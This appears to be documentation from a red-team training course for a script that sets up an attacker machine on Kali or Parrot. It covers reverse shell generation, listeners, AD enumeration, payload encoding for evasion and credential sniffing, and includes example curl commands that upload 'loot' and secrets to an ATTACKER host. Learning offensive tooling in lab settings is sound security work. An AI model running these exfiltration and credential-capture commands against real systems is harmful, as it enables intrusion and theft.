Attacker Machine Setup

A fully automated setup script that installs and configures every tool referenced across Red Team Academy. It works on both Kali Linux (2025.x / 2026.x) and Parrot OS (6.x). The script is modular — install everything at once or pick specific categories.

Quick Start

# Download the setup script
curl -sLO https://your-rta-host/scripts/rta-setup.sh
chmod +x rta-setup.sh

# Install everything (takes 30-60 minutes depending on connection)
sudo ./rta-setup.sh --all

# Or install specific modules
sudo ./rta-setup.sh --module core --module recon --module ad

# Preview what will be installed without doing anything
sudo ./rta-setup.sh --dry-run --all

# List available modules
sudo ./rta-setup.sh --list

Custom Tools Reference

The setup script installs 10 custom tools, each prefixed with rta- and symlinked into /usr/local/bin/.

rta-scan — Quick Port Scanner

Async port scanner with service banner grabbing. Faster than default Nmap for quick sweeps.

# Scan common ports
rta-scan 10.10.10.5

# Scan full range with more threads
rta-scan 10.10.10.5 --ports 1-65535 --threads 500

rta-subenum — Subdomain Aggregator

Aggregates subdomains from subfinder, amass, assetfinder, crt.sh, waybackurls, and gau. Deduplicates and optionally probes live hosts with httpx.

# Enumerate subdomains
rta-subenum example.com

# Save to specific file
rta-subenum example.com output-subs.txt

rta-revshell — Reverse Shell Generator

Generates reverse shell one-liners for 20+ languages and methods, including msfvenom commands and base64-encoded PowerShell.

# Generate a bash reverse shell
rta-revshell 10.10.14.5 4444

# Specific shell type
rta-revshell 10.10.14.5 4444 -t python-pty

# Base64-encoded PowerShell
rta-revshell 10.10.14.5 4444 -t powershell-b64

# Print all shell types at once
rta-revshell 10.10.14.5 4444 --all

# List available types
rta-revshell 10.10.14.5 4444 --list

rta-serve — HTTP File Server with Upload

Quick file transfer server. Supports GET (download) and POST (upload) for exfiltration or payload staging.

# Serve current directory
rta-serve

# Custom port and directory
rta-serve -p 9090 -d /opt/red-team/payloads

# Enable upload (attacker receives files from target)
rta-serve --upload

# Target uploads a file:
# curl -X POST --data-binary @loot.zip http://ATTACKER:8080/loot.zip
# curl -F 'file=@secrets.txt' http://ATTACKER:8080/

rta-adenum — AD Quick Enumeration

Wraps NetExec, Impacket, and BloodHound into a single command that runs domain enumeration and saves everything to a timestamped directory.

# Run full AD enumeration
rta-adenum 192.168.56.100 corp.local jsmith 'P@ssw0rd!'

# Output directory contains:
# users.txt, groups.txt, shares.txt, pass-policy.txt,
# kerberoast-hashes.txt, asrep-hashes.txt, bloodhound/

rta-webrecon — Web Recon Pipeline

Automated web recon: technology fingerprinting, header analysis, SSL inspection, directory brute force, crawling, JS endpoint extraction, vulnerability scanning, and WAF detection.

# Full recon pipeline against a target
rta-webrecon https://target.com

rta-listener — Quick Listener Setup

Start listeners with various backends.

# Netcat listener
rta-listener 4444

# Socat TTY listener (full interactive shell)
rta-listener 4444 --type socat

# Metasploit multi/handler
rta-listener 4444 --type msfmulti

# pwncat (if installed)
rta-listener 4444 --type pwncat

rta-hashid — Hash Type Identifier

Identifies hash types and provides the correct Hashcat mode and John format.

# Identify a hash
rta-hashid '$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$7e9c3f2a5b1d8e4c6a0f9b2d4e5c7a8b$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b'
rta-hashid '5f4dcc3b5aa765d61d8327deb882cf99'

# Pipe from file
cat hash.txt | rta-hashid

rta-encode — Payload Encoder

Encode shellcode or payloads for evasion. Supports XOR (outputs C array), Base64, and AES-256-CBC.

# XOR encode shellcode
rta-encode payload.bin -m xor -k 'mykey'

# AES encrypt
rta-encode payload.bin -m aes -k 'secretkey' -o encrypted.bin

# Base64
rta-encode payload.bin -m b64

rta-credsniff — Credential Capture

Quick setup for credential sniffing with Responder or targeted packet capture.

# Start Responder on eth0
rta-credsniff eth0 --responder

# Credential-focused packet capture
rta-credsniff eth0 --tcpdump

Shell Environment

The setup script creates ~/.rta-profile and sources it from both .bashrc and .zshrc. It provides aliases, functions, and environment variables.

Aliases

# Navigation
tools          # cd /opt/red-team
wordlists      # cd /opt/wordlists
custom         # cd /opt/red-team/custom

# Common operations
serve          # python3 -m http.server 8080
myip           # External IP
localip        # Local IP
ports          # Show listening ports

# Tool shortcuts
nxc            # netexec
msfconsole     # msfconsole -q (quiet mode)

Functions

# Set target for the session
target 10.10.10.5
echo $TARGET    # 10.10.10.5
echo $RHOST     # 10.10.10.5

# Route traffic through a SOCKS proxy
socks 1080      # Set SOCKS5 proxy on port 1080
unsocks         # Clear proxy settings

# Extract any archive format
extract file.tar.gz
extract file.7z
extract file.zip

Kali vs. Parrot OS Differences

The script handles both distributions transparently. Key differences:

FeatureKali LinuxParrot OS
Package managerapt (Debian testing)apt (Debian stable)
Pre-installed toolsMetasploit, Nmap, Aircrack, Hydra, JohnSame + AnonSurf, additional privacy tools
Default shellzshbash (some editions use zsh)
Python version3.12+3.11+
DockerAvailable but not pre-installedAvailable but not pre-installed

The script detects the distro at runtime and adjusts accordingly. Both .bashrc and .zshrc are configured.

Troubleshooting

Common Issues

# Check the full installation log
cat /var/log/rta-setup.log

# Re-run a single module after fixing an issue
sudo ./rta-setup.sh --module cloud

# If Go tools fail, check Go is in PATH
source /etc/profile.d/go-path.sh
go version

# If pipx tools fail, ensure pipx path
pipx ensurepath
source ~/.bashrc

# If Docker tools fail
sudo systemctl start docker
sudo usermod -aG docker $USER
# Then log out and back in
